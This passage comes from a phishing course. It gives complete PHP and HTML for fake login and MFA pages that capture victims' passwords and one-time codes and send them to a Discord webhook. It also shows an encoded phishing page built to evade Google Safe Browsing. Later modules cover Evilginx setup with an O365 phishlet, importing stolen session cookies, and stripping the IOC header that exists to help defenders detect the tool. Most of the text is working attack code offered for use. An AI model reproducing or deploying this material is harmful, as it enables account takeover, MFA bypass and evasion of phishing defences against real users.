4%65%72%2d%74%6f%70%2d%77%69%64%74%68%3a%20%31%70%78%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%72%69%67%68%74%2d%77%69%64%74%68%3a%20%31%70%78%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%6c%65%66%74%2d%77%69%64%74%68%3a%20%31%70%78%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%63%6f%6c%6f%72%3a%20%23%36%36%36%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%63%6f%6c%6f%72%3a%20%72%67%62%61%28%30%2c%30%2c%30%2c%2e%36%29%3b%0a%20%20%20%20%68%65%69%67%68%74%3a%20%33%36%70%78%3b%0a%20%20%20%20%6f%75%74%6c%69%6e%65%3a%20%6e%6f%6e%65%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%30%3b%0a%20%20%20%20%2d%77%65%62%6b%69%74%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%30%3b%0a%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%20%74%72%61%6e%73%70%61%72%65%6e%74%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%74%6f%70%2d%77%69%64%74%68%3a%20%30%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%6c%65%66%74%2d%77%69%64%74%68%3a%20%30%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%72%69%67%68%74%2d%77%69%64%74%68%3a%20%30%3b%0a%20%20%20%20%70%61%64%64%69%6e%67%2d%6c%65%66%74%3a%20%30%3b%0a%20%20%20%20%64%69%73%70%6c%61%79%3a%20%62%6c%6f%63%6b%3b%0a%20%20%20%20%77%69%64%74%68%3a%20%39%30%25%3b%0a%20%20%20%20%6d%61%72%67%69%6e%2d%62%6f%74%74%6f%6d%3a%20%31%35%70%78%3b%0a%7d%0a%2e%62%75%74%74%6f%6e%63%6f%6e%74%61%69%6e%65%72%20%7b%0a%20%20%20%20%70%6f%73%69%74%69%6f%6e%3a%20%61%62%73%6f%6c%75%74%65%3b%0a%20%20%20%20%62%6f%74%74%6f%6d%3a%20%37%32%70%78%3b%0a%20%20%20%20%72%69%67%68%74%3a%20%35%30%70%78%3b%0a%20%20%20%20%74%65%78%74%2d%61%6c%69%67%6e%3a%20%72%69%67%68%74%3b%0a%20%20%20%20%77%69%64%74%68%3a%20%31%30%30%25%3b%0a%7d%0a%2e%62%75%74%74%6f%6e%20%7b%0a%20%20%20%20%63%6f%6c%6f%72%3a%20%23%66%66%66%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%63%6f%6c%6f%72%3a%20%23%30%30%36%37%62%38%3b%0a%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%20%23%30%30%36%37%62%38%3b%0a%20%20%20%20%64%69%73%70%6c%61%79%3a%20%62%6c%6f%63%6b%3b%0a%20%20%20%20%77%69%64%74%68%3a%20%31%32%30%70%78%3b%0a%20%20%20%20%70%6f%73%69%74%69%6f%6e%3a%20%61%62%73%6f%6c%75%74%65%3b%0a%20%20%20%20%72%69%67%68%74%3a%20%30%70%78%3b%0a%20%20%20%20%70%61%64%64%69%6e%67%3a%20%35%70%78%20%31%34%70%78%20%36%70%78%20%31%34%70%78%3b%0a%7d%0a%2e%62%75%74%74%6f%6e%3a%68%6f%76%65%72%20%7b%0a%20%20%20%20%62%6f%72%64%65%72%2d%63%6f%6c%6f%72%3a%20%23%30%30%35%35%61%36%3b%0a%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%20%23%30%30%35%35%61%36%3b%0a%7d%0a%3c%2f%73%74%79%6c%65%3e%0a%3c%2f%68%65%61%64%3e%0a%3c%2f%68%74%6d%6c%3e%0a`

document.write(unescape(val));

```
Browsing to the `login.html` file does not trigger a Safe Browsing alert.

The video can be found in folder: `./videos/demo-3-safe-browsing.mp4`

Additionally, we verify on Google's Transparency Report that the website is still marked as safe.

## Conclusion
Google Safe Browsing is a basic security service that performs real-time signature detection on websites being accessed. To evade Safe Browsing, it is necessary to remove any suspicious strings from the domain name, URL, or web content, typically achieved through custom modification, encoding, or encrypting the content.

The removal of suspicious strings also helps against additional security scanners and vendors as many of them utilize signature detection as well as the Safe Browsing API.

## Resources

- Bypassing Web Proxies, Static Rules, and Google Safe Browsing at Scale

- Evade signature-based phishing detections

## Objectives
Research additional software and websites that utilize the Safe Browsing API

Obfuscate a different signatured phishing template and access it with Enhanced Protection enabled. Does the website get flagged?

OPTIONAL: Create a Python script that uses the Safe Browsing API to scan websites. Note: you will need an API key from the Google Cloud Console


---

# Módulo 77 — Coleta Manual de TOTP (Time-Based One-Time Password)

Módulo 77 — Manual Timed-Based One-Time Password (TOTP) Harvesting

- # Módulo 77 — Coleta Manual de TOTP (Time-Based One-Time Password)

# Disclaimer

## Introduction
Over the past several years, there's been an increase in the use and enforcement of Multi-Factor Authentication (MFA) in the majority of organizations. In many cases, MFA is becoming a security requirement and users have no option but to setup MFA in their organization. This creates a problem for attackers because phishing for credentials is not as effective when MFA is implemented.One common MFA methods is a Time-Based One Time Passcode (TOTP), where a user receives a passcode through an authenticator app, SMS, or a phone call and is valid for a short period of time. This type of token can be captured the same way credentials are captured and then used if it hasn't expired yet. For example, a phishing website may prompt the user to enter their login credentials and after submission, the website then requests an MFA token. Once the user provides the token, the attacker uses both the credentials and the token on the legitimate website quickly prior to the token expiring.This method uses no automation tools to automatically relay the credentials and instead relies on the attacker quickly using the credentials and MFA token. The obvious issue with this method is that the attacker needs to quickly react when the credentials and token are logged since the token will expire fairly quick. However, we will explore several methods that can increase the likelihood of the attacker entering the token prior to expiring.In this module, we design a phishing template and create backend scripts in order to harvest both credentials and MFA token in an effective manner.
## Initial Phishing Template
We will start with an ordinary phishing template, and this template will undergo improvements and modifications throughout the module. Two phishing pages will be needed for this module:
Login Page (`login.php`) - This page will be where users enter their credentials (e.g., username/email and password).

- MFA Entry Page (`mfa_landing.php`) - After entering their credentials, this page will prompt the user to enter the MFA token.

The HTML below is for a sample login page; however, we have made it a PHP script because we are using `session_start()`, which will be needed later to track the number of login attempts made by the user.

```
<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dfe1e6;
            border-radius: 5px;
            padding: 30px;
            width: 300px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #0052cc;
        }
        .login-container label {
            display: block;
            margin-bottom: 5px;
            text-align: left;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dfe1e6;
            border-radius: 3px;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #0052cc;
            color: #ffffff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
            box-sizing: border-box;
        }
        .login-container button:hover:enabled {
            background-color: #0747a6;
        }
        .login-container .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }
        .login-container .forgot-password a {
            color: #0052cc;
            text-decoration: none;
        }
        .login-container .forgot-password a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <form action="login.php" method="POST">
            <div>
                <label for="username">Username or email</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div>
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div>
                <button type="submit" id="submit-button">Log In</button>
            </div>
        </form>
    </div>
</body>
</html>

```
Next, the HTML for the MFA login page is shown below. Similar to the login page, we are using `session_start()`, and we have included an `if` statement that checks whether the user has entered the code twice. If the attempt count reaches two or more, the script triggers an HTTP 500 error response and displays an error message to prevent further attempts. The backend functionality that increments the number of attempts will be shown in the upcoming section.

```
<?php
session_start();

// Show an Error 500 if the user entered the code twice
if (isset($_SESSION['attempt_count']) && $_SESSION['attempt_count'] >= 2) {
    http_response_code(500);
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Error 500</title><style>body { display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; background-color: #f4f5f7; color: #000; } .error-container { text-align: center; }</style></head><body><div class="error-container"><h1>Error 500: Internal Server Error</h1><p>Something went wrong. Please try again later.</p></div></body></html>';
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two-Step Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dfe1e6;
            border-radius: 5px;
            padding: 30px;
            width: 300px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #0052cc;
        }
        .login-container label {
            display: block;
            margin-bottom: 5px;
            text-align: left;
        }
        .login-container input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dfe1e6;
            border-radius: 3px;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #0052cc;
            color: #ffffff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
            box-sizing: border-box;
        }
        .login-container button:hover:enabled {
            background-color: #0747a6;
        }
        .login-container .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }
        .login-container .forgot-password a {
            color: #0052cc;
            text-decoration: none;
        }
        .login-container .forgot-password a:hover {
            text-decoration: underline;
        }
        #login-mfa {
            font-weight: bold;
            color: #00003f
        }
    </style>
</head>
<body>
    <div class="login-container">

        <?php
        // Show an error banner when the user submits the code the first time
        if ($_SESSION['attempt_count'] > 0) {
        echo '<div class="alert alert-danger" role="alert" style="padding: 15px; margin-bottom: 20px; border: 1px solid transparent; border-radius: 4px; color: #721c24; background-color: #f8d7da; border-color: #f5c6cb;">Invalid code. Please try again.</div>';
        }
        ?>

        <p id="login-mfa">Continue with two-step verification</p>
        <p>Enter your verification code to continue</p>
        <form action="mfa.php" method="POST">
            <div>
                <input type="text" id="code" name="code" pattern="\d{6}" maxlength="6" minlength="6" placeholder="6-digit verification code" required>
            </div>
            <div>
                <button type="submit" id="submit-button">Continue</button>
            </div>
        </form>
    </div>
</body>
</html>

```

## Integrating Functionality
The next step is to create two PHP scripts with the first script, `login.php`, logging the username and password to a file and redirecting the user to the MFA entry page. Note that the credentials will not be encrypted to ensure we have speedy access to the credentials.

```
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   
    $username = $_POST['username'];
    $password = $_POST['password'];

    $logEntry = "Username: " . $username . " | Password: " . $password . "\n";
    $logFile = '/var/www/credentials_log.txt';
    file_put_contents($logFile, $logEntry, FILE_APPEND);

    // Redirect to MFA entry page
    header('Location: /mfa_landing.php');
    exit();
}
?>

```
Next, the MFA logging script, `mfa.php` will log the token and increment the `attempt_count`. If the `attempt_count` is one, the user will see an error banner asking them to enter the code again. This helps with edge cases where the code may have expired by the time we attempt to use it. If the user enters the code a second time, they will be redirected away to some benign page, in this case, `google.com`.

```
<?php
session_start();

if (!isset($_SESSION['attempt_count'])) {
    $_SESSION['attempt_count'] = 0;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['code'])) {

    // Logging
    $code = $_POST['code'];
    file_put_contents('credentials_log.txt', "Code: $code ", FILE_APPEND);

    $_SESSION['attempt_count']++;

    if ($_SESSION['attempt_count'] >= 2) {
        header('Location: https://www.google.com');
        exit();
    } else {
        header('Location: /mfa_landing.php');
        exit();
    }
}

?>

```

## Demo
The video can be found in folder: `./videos/demo-1-manual-mfa-bypass.mov`

## Adding Artificial Delays
Since the one-time code that we're capturing expires relatively quickly, we want to give ourselves as much time as possible to enter the captured credentials into the target website prior to receiving the one-time code. One strategy is to add artificial delays in the server's response between each step. In the code below, we update the MFA entry page to show a loading overlay for two seconds prior to displaying the input field for the one-time code.

```
<?php
session_start();

// Show an Error 500 if the user entered the code twice
if (isset($_SESSION['attempt_count']) && $_SESSION['attempt_count'] >= 2) {
    http_response_code(500);
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Error 500</title><style>body { display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; background-color: #f4f5f7; color: #000; } .error-container { text-align: center; }</style></head><body><div class="error-container"><h1>Error 500: Internal Server Error</h1><p>Something went wrong. Please try again later.</p></div></body></html>';
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two-Step Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dfe1e6;
            border-radius: 5px;
            padding: 30px;
            width: 300px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #0052cc;
        }
        .login-container label {
            display: block;
            margin-bottom: 5px;
            text-align: left;
        }
        .login-container input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dfe1e6;
            border-radius: 3px;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #0052cc;
            color: #ffffff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
            box-sizing: border-box;
        }
        .login-container button:hover:enabled {
            background-color: #0747a6;
        }
        .login-container .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }
        .login-container .forgot-password a {
            color: #0052cc;
            text-decoration: none;
        }
        .login-container .forgot-password a:hover {
            text-decoration: underline;
        }
        #login-mfa {
            font-weight: bold;
            color: #00003f
        }
        .spinner-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .spinner-overlay:before {
            content: '';
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="spinner-overlay" id="spinner-overlay"></div>
    <div class="login-container">

        <?php
        // Show an error banner when the user submits the code the first time
        if ($_SESSION['attempt_count'] > 0) {
        echo '<div class="alert alert-danger" role="alert" style="padding: 15px; margin-bottom: 20px; border: 1px solid transparent; border-radius: 4px; color: #721c24; background-color: #f8d7da; border-color: #f5c6cb;">Invalid code. Please try again.</div>';
        }
        ?>

        <p id="login-mfa">Continue with two-step verification</p>
        <p>Enter your verification code to continue</p>
        <form action="mfa.php" method="POST">
            <div>
                <input type="text" id="code" name="code" pattern="\d{6}" maxlength="6" minlength="6" placeholder="6-digit verification code" required>
            </div>
            <div>
                <button type="submit" id="submit-button">Continue</button>
            </div>
        </form>
    </div>
</body>
<script>
    // Hide the spinner after 2 seconds
    document.addEventListener('DOMContentLoaded', function() {
        setTimeout(function() {
            document.getElementById('spinner-overlay').style.display = 'none';
        }, 2000);
    });
</script>
</html>

```
The video can be found in folder: `./videos/demo-w-delays.mov`

## Deliver Credentials And Token Via Discord
Due to how time sensitive the process is, it's recommended to use a more robust approach than saving the credentials and token on the server. For this case, we will use Discord to receive the credentials and one-time token.

We will need to update the `login.php` and `mfa.php` scripts to send the content to Discord rather than storing them on the server. First, the `login.php` script sends the username and password to the Discord server and then redirects the user to `mfa_landing.php`, where they will enter their MFA code.

```
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $data = json_encode([
        "content" => "Username: " . $username . " | Password: " . $password,
        "username" => "MFA Bot",
    ]);

    // Replace this with your Webhook URL
    $WEBHOOK_URL = "https://discord.com/api/webhooks/12345";

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $WEBHOOK_URL,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
        ],
        CURLOPT_RETURNTRANSFER => true,
    ));

    $response = curl_exec($ch);
    curl_close($ch);

    header('Location: /mfa_landing.php');
    exit();
}
?>

```
The updated `mfa.php` file sends the MFA code to the Discord server. If the user has entered the code once, they are redirected to `mfa_landing.php` to enter the code again. If the code has been entered twice, they are redirected to `google.com`.

Update the `$WEBHOOK_URL` with your Discord Webhook.

```
<?php
session_start();

if (!isset($_SESSION['attempt_count'])) {
    $_SESSION['attempt_count'] = 0;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['code'])) {

    $code = $_POST['code'];

    $data = json_encode([
        "content" => "Code: " . $code,
        "username" => "MFA Bot",
    ]);

    // Replace this with your Webhook URL
    $WEBHOOK_URL = "https://discord.com/api/webhooks/12345";

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $WEBHOOK_URL,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
        ],
        CURLOPT_RETURNTRANSFER => true,
    ));

    $response = curl_exec($ch);
    curl_close($ch);

    $_SESSION['attempt_count']++;

    if ($_SESSION['attempt_count'] >= 2) {
        header('Location: https://www.google.com');
        exit();
    } else {
        header('Location: /mfa_landing.php');
        exit();
    }
}
?>

```
The video can be found in folder: `./videos/demo-2-manual-mfa-bypass.mp4`

## Conclusion
This module demonstrated how we can capture an MFA one-time token, similar to how we captured the user's credentials. The key aspect when using this method is that the token must be used quickly before it expires. Therefore, sending alerts when a user accesses the website or begins typing can be useful in order to prepare ourselves to use the credentials and token.

## Objectives
Deliver the credentials and MFA token to an external service such as Discord, Telegram or Slack

Try to implement some automation in the phishing process such as entering the credentials into the legitimate target website. This may require research into browser automation tools (e.g. Selenium, Puppeteer). This can be anything from credentials validation, to simply opening up a browser and entering the credentials into the appropriate fields thus speeding up the process


---

# Módulo 78 — Adversary-In-The-Middle (AITM) via Evilginx

Módulo 78 — Adversary-In-The-Middle (AITM) Via Evilginx

- # Módulo 78 — Adversary-In-The-Middle (AITM) via Evilginx

# Disclaimer

## Introduction
Adversary-In-The-Middle (AITM) is a type of phishing attack where an attacker intercepts and manipulates a user's connection with a legitimate website, to steal credentials and session cookies. This is achieved by setting up a proxy server that sits between the client and the target website, enabling the interception of server responses, including session cookies, and thereby bypassing MFA.The diagram below from Microsoft's blog post illustrates how AITM works:There are existing tools such as Evilginx that are designed for AITM phishing. Therefore, in this module, we will setup Evilginx and understand how it allows us to bypass MFA.
Note: The setup demonstrated in this module has several opsec flaws which will be discussed in upcoming modules.

Note: Since building phishlets is not the primary goal of this module, the phishlet used in this module will not be kept up-to-date and may cease to work correctly in the future.

## Installing Evilginx
To install Evilginx, we have the option of either compiling it or downloading and using the pre-built binary. Since in this module will not modify the source code, we will use the pre-built binary. Run the commands below to download and install Evilginx:
```
mkdir aitm

cd aitm

# Check https://github.com/kgretzky/evilginx2/releases/tag/v3.3.0 to ensure the URL is up to date
curl -L https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.zip -o evilginx.zip

# Unzip
unzip evilginx.zip

# Make it executable
chmod +x evilginx

# Launch Evilginx in debug mode
./evilginx -debug

```

## Evilginx Phishlets
Evilginx phishlets are YAML configuration files that define how the tool intercepts and proxies traffic between a target and a legitimate website. They specify domain settings, request modifications, and security bypass techniques. Each phishlet is tailored to a specific target site, ensuring accurate replication of login flows and bypassing security measures like bot detection and anti-phishing protections.The main keys in the YAML phishlet file are listed and explained below:
`name` - The name of the phishlet.

- `author` - The creator of the phishlet.

- `min_ver` - The minimum Evilginx version required for compatibility.

- `proxy_hosts` - Specifies the domain and subdomains to proxy. The `phish_sub` represents the subdomain that the phishing page will mimic.

- `sub_filters` - Replaces instances of the legitimate domain with the phishing domain, ensuring the phishing page functions correctly.

- `auth_tokens` - Identifies the session cookies to capture from the victim’s browser, allowing unauthorized access to their account.

- `creds` - Defines the credentials the phishlet is designed to steal. The key represents the credential name (e.g., username or password), while the search uses a regular expression to extract these details from the user's input.

- `auth_urls` - Lists the URLs Evilginx monitors for authentication. After the victim logs in, Evilginx detects redirects to these URLs and captures the specified auth_tokens.

- `login` - Specifies the fields for the username and password in the login form of the target website. The `url` indicates the page where the victim enters their credentials.

- `force_post` - Ensures that certain requests are always sent as `POST` instead of `GET`, modifying the original HTTP method.

- `is_landing` - Determines whether the page serves as the phishing attack’s landing page when set to `true`.

- `js_inject` - Custom JavaScript to be injected into the phishing page.

For this module, we will use the O365 phishlet available here by BakkerJan. The phishlet must be saved in the `phishlets` folder:

```
cd phishlets

# Paste the O365 phishlet and save it
nano o365.yaml

```
For convenience, the O365 phishlet is shown below.

```
name: 'Microsoft 365'
author: 'Jan Bakker'
min_ver: '3.1.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'aadcdn', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
    type: 'cookie'
credentials:
  username:
    key: '(login|UserName)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|Password|accesspass)'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'mfaAuthMethod'
      search: '(.*)'
      type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/'

```

## Evilginx Configuration
Once the phishlet has been placed in the `phishlets` directory, re-run Evilginx using `./evilginx -debug`. We will need to configure Evilginx to use our domain name and IP address. Use the commands below to do so:

```
# Replace domain.com with your domain
config domain domain.com

# Replace 1.2.3.4 with your server's IPv4 address
config ipv4 external 1.2.3.4

```

Another important configuration is the `unauth_url`, which specifies where unauthorized users should be redirected. By default, the URL is set to a YouTube link, which can potentially be used to fingerprint the server as an Evilginx server. Modify the `unauth_url` using the command below:

```
config unauth_url https://example.com

```

### DNS Configuration
Based on the specified `phish_sub` values, we will need to create one or more subdomains that point to our server's IP address. Using our O365 phishlet, we will create three subdomains `login`, `www`, and `aadcdn`.

```
proxy_hosts:
  - {phish_sub: 'login' ...}
  - {phish_sub: 'www' ...}
  - {phish_sub: 'aadcdn' ...}

```

## Enabling Phishlet
Once the DNS configuration is completed, we can activate the phishlet using the commands below. Note that we are blacklisting unauthorized clients prior to enabling the phishlet.

```
# Replace domain.com with your domain
phishlets hostname o365 domain.com

# Blacklist unauthorized IPs accessing the website
blacklist unauth

# Enable O365 phishlet
phishlets enable o365

```
Running `phishlets enable o365` will request an SSL certificate via Let's Encrypt for each subdomain before completing the activation. However, this may fail if HTTP/HTTPS are blocked, therefore ensure that the firewall has been configured correctly using `ufw` or `iptables`.

## Lures
Once the phishlet is activated and the SSL certificates are deployed, we immediately begin to see unauthorized automated traffic scanning our website. The unauthorized traffic will be blocked and redirected to our `unauth_url` since we used `blacklist unauth`.

In order to access our phishing website, we must create a lure, which generates a unique URL that directs the target to the phishing page. To create a lure use the command below:

```
lures create o365

```
Then retrieve the link using the following command. Replace the `<id>` with the ID provided from the previous command.

```
lures get-url <id>

```

Traversing to the lure, we see the phishing page load successfully.

## Capturing & Importing Cookies
To test the phishlet, enter your credentials into the phishing page, and upon MFA completion, enter the `sessions` command into Evilginx's terminal. The `sessions` command will list out all captured credentials and session tokens. To view the details of a specific entry, type `session <id>`.

If the cookie was successfully captured, we can import it into our browser using the StorageAce Browser Extension. Follow the steps below to import the cookie:

1.Install the StorageAce extension.

2.Navigate to `login.microsoftonline.com`.

3.Delete all existing cookies by clicking the trash icon.

4.Click "Import" and paste the captured cookie.

5.Refresh the page.

At this point, you should be logged in, successfully bypassing MFA.

## Opsec Flaws
As mentioned in the start of this module, there are various flaws with our current setup that can result in our setup being easily detected, specifically:

- JA4+ fingerprints - The Evilginx JA4 fingerprints

- IOC Header - The Evilginx IOC header was placed on purpose to allow defenders to easily detect Evilginx.

- SSL certificate - We should utilize a wildcard SSL certificate to hide the subdomain names.

- Static content (Title, favicon, HTML) - The HTML static content needs to be obfuscated.

- URL pattern - The URL pattern is unique to Microsoft's legitimate login page and can result in detection.

- Slow loading - The input fields take a while to load correctly.

These issues will be addressed in the following module.

## References

- Evilginx3 Microsoft Phishlet

- Evilginx2-Phishlets

- StorageAce

## Objectives
Download, install, and configure Evilginx

Review the Evilginx phishlet documentation to better understand its format

Capture and import Microsoft session cookies


---

# Módulo 79 — Customizando Configuração OPSEC do Evilginx

Módulo 79 — Customizing Evilginx Opsec Configuration

- # Módulo 79 — Customizando Configuração OPSEC do Evilginx

# Disclaimer
# Module 79 - Customizing Evilginx: Opsec Configuration

## Introduction
In the previous module, we installed and configured Evilginx along with the O365 phishlet. While the setup worked, it had several opsec flaws that made it easy for internet scanners and defenders to detect. In this module, we will set up Evilginx and the O365 phishlet again, but with an emphasis on opsec to reduce the risk of detection.
## IOC Header Removal
Evilginx comes with an IOC header `X-Evilginx` that helps defenders easily identify and locate the Evilginx server. The IOC header is sent within requests to the origin server that is being proxied. This was placed by the creator @mrgretzky to reduce the likelihood of the tool being used for malicious purposes.Since we used the pre-built binaries and did not modify the source code, the IOC header was included in our previous setup. Therefore, we will clone the repository and manually remove the lines that display the header. To start, clone the repository:
```
# Install git if it doesnt already exist
sudo apt install git

# Clone evilginx repo
git clone https://github.com/kgretzky/evilginx2.git

```
Next, open `http_proxy.go` in a file editor to modify the necessary lines.
```
cd evilginx2/core

nano http_proxy.go

```
The lines to remove can be found below along with their line numbers. If you're using `nano` to edit the file, press `CTRL + W` to search for each line, then use `CTRL + K` to delete it.
```
// Line 469
req.Header.Set(p.getHomeDir(), o_host)

// Line 659
req.Header.Set(p.getHomeDir(), o_host)

// Line 1791
func (p *HttpProxy) getHomeDir() string {
	return strings.Replace(HOME_DIR, ".e", "X-E", 1) 
}

```

### Compiling Evilginx
Once the lines have been removed from the `http_proxy.go` file, we can compile Evilginx using the commands below.
```
# Install golang version 1.22
curl -L https://go.dev/dl/go1.22.11.linux-amd64.tar.gz -o go.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go.tar.gz

# Add the go binary to the environment vars
export PATH=$PATH:/usr/local/go/bin

# Verify version - should be 1.22
go version

# Ensure you're in the evilginx2 directory NOT evilginx2/core
go build .

```
The `go build .` command will generate a binary that needs to be made executable before running it.
```
chmod +x evilginx2

./evilginx2

```

## Unique Phishlet Subdomains
Next, we'll use the same O365 phishlet from the previous module, however, we will modify the `proxy_hosts` list items within the phishlet. Specifically, we will modify the `phish_sub` values because defenders can currently search these four subdomains and if found, they could potentially infer that this setup is using the Evilginx phishlet.The updated phishlet is shown below with the subdomains modified to be more unique.
```
name: 'Microsoft 365'
author: 'Jan Bakker'
min_ver: '3.1.0'
proxy_hosts:
  - {phish_sub: 'auth-prod', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'uniquecdn', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
    type: 'cookie'
credentials:
  username:
    key: '(login|UserName)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|Password|accesspass)'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'mfaAuthMethod'
      search: '(.*)'
      type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/'

```
Our DNS `A` records are also updated accordingly, as shown in the image below.
## Login Delay
When using the previous phishlet, you may notice a delay in loading the input field when accessing the phishing page, displaying the message "Trying to sign you in".This issue occurs because certain authentication resources are not being proxied. To resolve it, add the following entry to `proxy_hosts` to ensure `login.live.com` is properly proxied:
```
...
- { phish_sub: 'sso-prod', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false }
...

```
The updated phishlet with `login.live.com` being proxied is shown below.
```
name: 'Microsoft 365'
author: 'Jan Bakker'
min_ver: '3.1.0'
proxy_hosts:
  - {phish_sub: 'auth-prod', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'uniquecdn', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
